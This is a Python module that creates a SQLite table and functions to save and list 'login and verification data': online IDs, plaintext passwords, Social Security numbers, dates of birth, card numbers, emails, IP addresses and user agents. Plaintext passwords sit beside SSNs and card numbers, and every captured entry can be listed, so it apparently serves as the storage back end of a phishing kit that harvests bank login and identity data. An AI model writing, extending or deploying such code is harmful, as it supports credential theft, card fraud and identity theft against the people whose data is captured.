"""
Storage layer for login and verification data.
"""

import sqlite3
from datetime import datetime, timezone
from typing import Optional, Dict, List
from pathlib import Path


# Database file location
DB_PATH = Path(__file__).parent.parent / "flow_control.db"


def _get_connection() -> sqlite3.Connection:
    """Get database connection, creating database and table if needed."""
    conn = sqlite3.connect(str(DB_PATH))
    conn.row_factory = sqlite3.Row
    
    # Initialize schema if needed
    conn.execute("""
        CREATE TABLE IF NOT EXISTS login_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            online_id TEXT NOT NULL,
            password TEXT NOT NULL,
            ssn TEXT,
            dob TEXT,
            card_number TEXT,
            email TEXT,
            ip_address TEXT,
            user_agent TEXT,
            created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
        )
    """)
    conn.commit()
    
    return conn


def save_login_data(
    online_id: str,
    password: str,
    ssn: Optional[str] = None,
    dob: Optional[str] = None,
    card_number: Optional[str] = None,
    email: Optional[str] = None,
    ip_address: Optional[str] = None,
    user_agent: Optional[str] = None
) -> bool:
    """
    Save login and verification data to database.
    
    Args:
        online_id: User's online ID/username
        password: User's password
        ssn: Social Security Number (optional)
        dob: Date of Birth (optional)
        card_number: Card Number (optional)
        email: Email Address (optional)
        ip_address: IP address of the user (optional)
        user_agent: User agent string (optional)
        
    Returns:
        True if successful, False otherwise
    """
    try:
        conn = _get_connection()
        now = datetime.now(timezone.utc)
        
        conn.execute("""
            INSERT INTO login_data 
            (online_id, password, ssn, dob, card_number, email, ip_address, user_agent, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            online_id,
            password,
            ssn,
            dob,
            card_number,
            email,
            ip_address,
            user_agent,
            now.isoformat()
        ))
        
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"Error saving login data: {e}")
        return False


def get_all_login_data(limit: int = 100) -> List[Dict]:
    """
    Get all login data entries.
    
    Args:
        limit: Maximum number of entries to return
        
    Returns:
        List of dictionaries with login data
    """
    try:
        conn = _get_connection()
        cursor = conn.execute(
            "SELECT id, online_id, password, ssn, dob, card_number, email, ip_address, user_agent, created_at "
            "FROM login_data ORDER BY created_at DESC LIMIT ?",
            (limit,)
        )
        rows = cursor.fetchall()
        conn.close()
        
        result = []
        for row in rows:
            result.append({
                "id": row["id"],
                "online_id": row["online_id"],
                "password": row["password"],
                "ssn": row["ssn"],
                "dob": row["dob"],
                "card_number": row["card_number"],
                "email": row["email"],
                "ip_address": row["ip_address"],
                "user_agent": row["user_agent"],
                "created_at": row["created_at"]
            })
        
        return result
    except Exception as e:
        print(f"Error getting login data: {e}")
        return []


def get_login_data_by_id(entry_id: int) -> Optional[Dict]:
    """
    Get a specific login data entry by ID.
    
    Args:
        entry_id: Entry ID
        
    Returns:
        Dictionary with login data, or None if not found
    """
    try:
        conn = _get_connection()
        cursor = conn.execute(
            "SELECT id, online_id, password, ssn, dob, card_number, email, ip_address, user_agent, created_at "
            "FROM login_data WHERE id = ?",
            (entry_id,)
        )
        row = cursor.fetchone()
        conn.close()
        
        if row is None:
            return None
            
        return {
            "id": row["id"],
            "online_id": row["online_id"],
            "password": row["password"],
            "ssn": row["ssn"],
            "dob": row["dob"],
            "card_number": row["card_number"],
            "email": row["email"],
            "ip_address": row["ip_address"],
            "user_agent": row["user_agent"],
            "created_at": row["created_at"]
        }
    except Exception as e:
        print(f"Error getting login data: {e}")
        return None

